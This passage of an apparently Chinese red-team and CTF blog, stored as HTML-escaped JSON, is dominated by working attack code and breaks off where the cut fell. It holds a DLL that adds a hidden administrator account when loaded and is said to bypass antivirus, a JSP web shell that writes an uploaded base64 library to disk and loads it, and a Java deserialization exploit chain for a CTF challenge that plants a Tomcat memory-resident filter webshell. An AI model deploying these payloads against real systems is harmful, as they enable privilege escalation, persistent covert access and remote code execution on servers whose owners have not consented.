http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa379159(v&#x3D;vs.85).aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tb &#x3D; LookupAccountName(</span><br><span class=\"line\">\t\tNULL,\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t_T(&quot;audit&quot;),\t&#x2F;&#x2F; account name</span><br><span class=\"line\">\t\tSid,\t\t\t&#x2F;&#x2F; SID</span><br><span class=\"line\">\t\t&amp;cbSid,\t\t\t&#x2F;&#x2F; SID size</span><br><span class=\"line\">\t\tDomain,\t\t\t&#x2F;&#x2F; Domain</span><br><span class=\"line\">\t\t&amp;cbDomain,\t\t&#x2F;&#x2F; Domain size</span><br><span class=\"line\">\t\t&amp;snu\t\t\t&#x2F;&#x2F; SID_NAME_USE (enum)</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!b) &#123;</span><br><span class=\"line\">\t\tdw &#x3D; GetLastError();</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;LookupAccountName FAIL %d 0x%08x\\r\\n&quot;), dw, dw);</span><br><span class=\"line\">\t\treturn dw;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Add user to &quot;Administrators&quot; local group</span><br><span class=\"line\">\t&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370436%28v&#x3D;VS.85%29.aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmemset(&amp;gd, 0, sizeof(gd));</span><br><span class=\"line\"></span><br><span class=\"line\">\tgd.lgrmi0_sid &#x3D; (PSID)Sid;</span><br><span class=\"line\"></span><br><span class=\"line\">\trc &#x3D; NetLocalGroupAddMembers(</span><br><span class=\"line\">\t\tNULL,\t\t\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t_T(&quot;Administrators&quot;),</span><br><span class=\"line\">\t\t0,\t\t\t\t\t\t&#x2F;&#x2F; information level</span><br><span class=\"line\">\t\t(LPBYTE)&amp;gd,</span><br><span class=\"line\">\t\t1\t\t\t\t\t\t&#x2F;&#x2F; only one entry</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (rc !&#x3D; NERR_Success) &#123;</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;NetLocalGroupAddMembers FAIL %d 0x%08x\\r\\n&quot;), rc, rc);</span><br><span class=\"line\">\t\treturn rc;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">                       DWORD  ul_reason_for_call,</span><br><span class=\"line\">                       LPVOID lpReserved</span><br><span class=\"line\">                     )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    switch (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    case DLL_PROCESS_ATTACH:</span><br><span class=\"line\">\t\tCreateAdminUserInternal();</span><br><span class=\"line\">    case DLL_THREAD_ATTACH:</span><br><span class=\"line\">    case DLL_THREAD_DETACH:</span><br><span class=\"line\">    case DLL_PROCESS_DETACH:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要一个管理员身份才有权限添加用户。成功绕过杀软添加用户。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220831152710826.png\" alt=\"image-20220831152710826\"></p>\n<p>师傅的项目里还有RDP以及dump内存等代码</p>\n<h1 id=\"jsp\"><a href=\"#jsp\" class=\"headerlink\" title=\"jsp\"></a>jsp</h1><p>直接搬来大佬的jsp，通过base64解密后写入随机命名的dll，然后进行load。可拓展为反序列化，JNDI注入等等。</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.RandomAccessFile&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"comment\">// 获取随机的动态链接库文件名称</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> String <span class=\"title\">getFileName</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        String fileName = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        java.util.Random random = <span class=\"keyword\">new</span> java.util.Random(System.currentTimeMillis());</span><br><span class=\"line\">        String os = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (os.contains(<span class=\"string\">&quot;windows&quot;</span>))&#123;</span><br><span class=\"line\">            fileName = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\&quot;</span> + random.nextInt(<span class=\"number\">10000000</span>) + <span class=\"string\">&quot;.dll&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            fileName = <span class=\"string\">&quot;/tmp/&quot;</span>+ random.nextInt(<span class=\"number\">10000000</span>) + <span class=\"string\">&quot;.so&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fileName;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// JSP 声明函数中无法获取全局默认的ServletRequest对象，但ServletRequest继承java.io.InputStream，可以替代</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">UploadBase64DLL</span><span class=\"params\">(java.io.InputStream stream)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        sun.misc.BASE64Decoder b = <span class=\"keyword\">new</span> sun.misc.BASE64Decoder();</span><br><span class=\"line\">        java.io.File file = <span class=\"keyword\">new</span> java.io.File(getFileName());</span><br><span class=\"line\">        java.io.FileOutputStream fos = <span class=\"keyword\">new</span> java.io.FileOutputStream(file);</span><br><span class=\"line\">        fos.write(b.decodeBuffer(stream));</span><br><span class=\"line\">        fos.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file.getAbsolutePath();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">RuntimeLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        Runtime.getRuntime().load(path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">SystemLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        System.load(path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 有些JDK版本没有这个对象，因此采用反射加载进行运行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">NativeLoad</span><span class=\"params\">(String path)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Class Native = Class.forName(<span class=\"string\">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Native != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class=\"string\">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class=\"line\">            Load.invoke(path);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//&lt;/jsp:declaration&gt;</span></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    out.print(<span class=\"string\">&quot;OK&quot;</span>);</span><br><span class=\"line\">    <span class=\"comment\">//加载方式</span></span><br><span class=\"line\">    String method = request.getHeader(<span class=\"string\">&quot;WWW-Authenticate&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        ServletInputStream stream = request.getInputStream();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stream.available() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            out.println(System.getProperty(<span class=\"string\">&quot;os.arch&quot;</span>));</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String file =  UploadBase64DLL(stream);</span><br><span class=\"line\">        <span class=\"comment\">// 按照Header头选择加载方式</span></span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (method)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">                RuntimeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;2&quot;</span>:</span><br><span class=\"line\">                SystemLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;3&quot;</span>:</span><br><span class=\"line\">                NativeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                RuntimeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">        System.out.println(e.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功写入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220825171954049.png\" alt=\"image-20220825171954049\"></p>\n<h1 id=\"武器化思考\"><a href=\"#武器化思考\" class=\"headerlink\" title=\"武器化思考\"></a>武器化思考</h1><p>浅显的思考可利用的地方</p>\n<ul>\n<li>编写多功能DLL，按需执行其中的特定功能</li>\n<li>dll与spring有没有一些利用</li>\n<li>能否实现无文件落地加载dll</li>\n</ul>\n<p>Rvn0xsy项目代码：<a href=\"https://github.com/Rvn0xsy/j2osWin\">Rvn0xsy/j2osWin (github.com)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/nice0e3/p/14067160.html\">Java安全之JNI绕过RASP - nice_0e3 - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://javasec.org/javase/JNI/\">JNI 安全基础 · 攻击Java Web应用(javasec.org)</a></p>\n<p><a href=\"http://payloads.online/archivers/2022-08-11/1/\">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>\n<p><a href=\"https://tttang.com/archive/1436/\">Java加载动态链接库 - 跳跳糖 (tttang.com)</a></p>\n","categories":["Red-Team"]},{"title":"java题目","url":"/2023/12/25/java-chall/","content":"<p>java-chall</p>\n<a id=\"more\"></a>\n\n<h1 id=\"长城杯预赛-b4bycoffee\"><a href=\"#长城杯预赛-b4bycoffee\" class=\"headerlink\" title=\"长城杯预赛-b4bycoffee\"></a>长城杯预赛-b4bycoffee</h1><ul>\n<li>二次反序列化</li>\n</ul>\n<p>再贴一个其他的解法：<a href=\"https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww\">https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww</a></p>\n<p>反序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220901164958434.png\" alt=\"image-20220901164958434\"></p>\n<p>看一下 AntObjectInputStream，很明显，ban了ROME常见的几种触发方式，唯独缺少了 <strong>EqualsBean</strong>，然后又ban了 <strong>TemplatesImpl</strong>，可以利用 <strong>二次反序列化</strong> 绕过</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20220901165039922.png\" alt=\"image-20220901165039922\"></p>\n<p>那么整个流程为：</p>\n<blockquote>\n<p>Hashtable#readObject -&gt; EqualsBean#equals -&gt; SignedObject#getObject -&gt; SignedObject#readObject -&gt; Hashtable#readObject -&gt; EqualsBean#equals -&gt; TemplatesImpl#getOutputProperties -&gt; RCE</p>\n</blockquote>\n<p>exp注入内存马</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> shell;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassClassPath;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.LifecycleState;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPair;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPairGenerator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.Signature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.SignedObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Hashtable <span class=\"title\">getPayload</span><span class=\"params\">(Class clazz, Object payloadObj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        EqualsBean bean = <span class=\"keyword\">new</span> EqualsBean(String.class, <span class=\"string\">&quot;s&quot;</span>);</span><br><span class=\"line\">        HashMap map1 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        HashMap map2 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;yy&quot;</span>, bean);</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;zZ&quot;</span>, payloadObj);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;zZ&quot;</span>, bean);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;yy&quot;</span>, payloadObj);</span><br><span class=\"line\">        Hashtable table = <span class=\"keyword\">new</span> Hashtable();</span><br><span class=\"line\">        table.put(map1, <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">        table.put(map2, <span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">        setFieldValue(bean, <span class=\"string\">&quot;beanClass&quot;</span>, clazz);</span><br><span class=\"line\">        setFieldValue(bean, <span class=\"string\">&quot;obj&quot;</span>, payloadObj);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> table;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 字节码</span></span><br><span class=\"line\">        ClassPool pool = ClassPool.getDefault();</span><br><span class=\"line\">        pool.insertClassPath(<span class=\"keyword\">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class=\"line\">        CtClass cc = pool.get(payload.class.getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;ping ocdpeh.dnslog.cn\\&quot;);&quot;;</span></span><br><span class=\"line\">        <span class=\"comment\">//        cc.makeClassInitializer().insertBefore(cmd);</span></span><br><span class=\"line\">        String randomClassName = <span class=\"string\">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class=\"line\">        cc.setName(randomClassName);</span><br><span class=\"line\">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] classBytes = cc.toBytecode();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[][] targetByteCodes = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][] &#123;classBytes&#125;;</span><br><span class=\"line\">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Hashtable table1 = getPayload(Templates.class, templates);</span><br><span class=\"line\"></span><br><span class=\"line\">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(<span class=\"string\">&quot;DSA&quot;</span>);</span><br><span class=\"line\">        kpg.initialize(<span class=\"number\">1024</span>);</span><br><span class=\"line\">        KeyPair kp = kpg.generateKeyPair();</span><br><span class=\"line\">        SignedObject signedObject =</span><br><span class=\"line\">                <span class=\"keyword\">new</span> SignedObject(table1, kp.getPrivate(), Signature.getInstance(<span class=\"string\">&quot;DSA&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        Hashtable table2 = getPayload(SignedObject.class, signedObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream barr = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(barr);</span><br><span class=\"line\">        oos.writeObject(table2);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(<span class=\"keyword\">final</span> Object obj, <span class=\"keyword\">final</span> String fieldName, <span class=\"keyword\">final</span> Object value)</span></span></span><br><span class=\"line\"><span class=\"function\">            <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Field <span class=\"title\">getField</span><span class=\"params\">(<span class=\"keyword\">final</span> Class&lt;?&gt; clazz, <span class=\"keyword\">final</span> String fieldName)</span> </span>&#123;</span><br><span class=\"line\">        Field field = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            field = clazz.getDeclaredField(fieldName);</span><br><span class=\"line\">            field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (clazz.getSuperclass() != <span class=\"keyword\">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> field;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">payload</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String filterUrlPattern = <span class=\"string\">&quot;/*&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String filterName = <span class=\"string\">&quot;KpLi0rn&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                ServletContext servletContext = getServletContext();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (servletContext != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    Field ctx = servletContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">                    ctx.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                    ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">                    Field stdctx = appctx.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">                    stdctx.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                    StandardContext standardContext = (StandardContext) stdctx.get(appctx);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (standardContext != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 这样设置不会抛出报错</span></span><br><span class=\"line\">                        Field stateField =</span><br><span class=\"line\">                                org.apache.catalina.util.LifecycleBase.class.getDeclaredField(</span><br><span class=\"line\">                                        <span class=\"string\">&quot;state&quot;</span>);</span><br><span class=\"line\">                        stateField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                        stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">                        Filter myFilter = <span class=\"keyword\">new</span> payload();</span><br><span class=\"line\">                        <span class=\"comment\">// 调用 doFilter 来动态添加我们的 Filter</span></span><br><span class=\"line\">                        <span class=\"comment\">// 这里也可以利用反射来添加我们的 Filter</span></span><br><span class=\"line\">                        javax.servlet.FilterRegistration.Dynamic filterRegistration =</span><br><span class=\"line\">                                servletContext.addFilter(filterName, myFilter);</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">// 进行一些简单的设置</span></span><br><span class=\"line\">                        filterRegistration.setInitParameter(<span class=\"string\">&quot;encoding&quot;</span>, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">                        filterRegistration.setAsyncSupported(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">                        <span class=\"comment\">// 设置基本的 url pattern</span></span><br><span class=\"line\">                        filterRegistration.addMappingForUrlPatterns(</span><br><span class=\"line\">                                java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),</span><br><span class=\"line\">                                <span class=\"keyword\">false</span>,</span><br><span class=\"line\">                                <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;/*&quot;</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">// 将服务重新修改回来，不然的话服务会无法正常进行</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (stateField != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                            stateField.set(</span><br><span class=\"line\">                                    standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">// 在设置之后我们需要 调用 filterstart</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (standardContext != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                            <span class=\"comment\">// 设置filter之后调用 filterstart 来启动我们的 filter</span></span><br><span class=\"line\">                            Method filterStartMethod =</span><br><span class=\"line\">                                    StandardContext.class.getDeclaredMethod(<span class=\"string\">&quot;filterStart&quot;</span>);</span><br><span class=\"line\">                            filterStartMethod.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">                            filterStartMethod.invoke(standardContext, <span class=\"keyword\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"comment\">/** 将我们的 filtermap 插入到最前面 */</span></span><br><span class=\"line\">                            Class ccc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                ccc =</span><br><span class=\"line\">                                        Class.forName(</span><br><span class=\"line\">                                                <span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ccc == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                    ccc = Class.forName(<span class=\"string\">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class=\"line\">                                &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"comment\">// 把filter插到第一位</span></span><br><span class=\"line\">                            Method m =</span><br><span class=\"line\">                                    Class.forName(<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span><br><span class=\"line\">                                            .getDeclaredMethod(<span class=\"string\">&quot;findFilterMaps&quot;</span>);</span><br><span class=\"line\">                            Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class=\"line\">                            Object[] tmpFilterMaps = <span class=\"keyword\">new</span> Object[filterMaps.length];</span><br><span class=\"line\">                            <span class=\"keyword\">int</span> index = <span class=\"number\">1</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class=\"line\">                                Object o = filterMaps[i];</span><br><span class=\"line\">                                m = ccc.getMethod(<span class=\"string\">&quot;getFilterName&quot;</span>);</span><br><span class=\"line\">                                String name = (String) m.invoke(o);</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class=\"line\">                                    tmpFilterMaps[<span class=\"number\">0</span>] = o;</span><br><span class=\"line\">                                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                    tmpFilterMaps[index++] = filterMaps[i];</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class=\"line\">                                filterMaps[i] = tmpFilterMaps[i];</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// webshell命令参数名</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String cmdParamName = <span 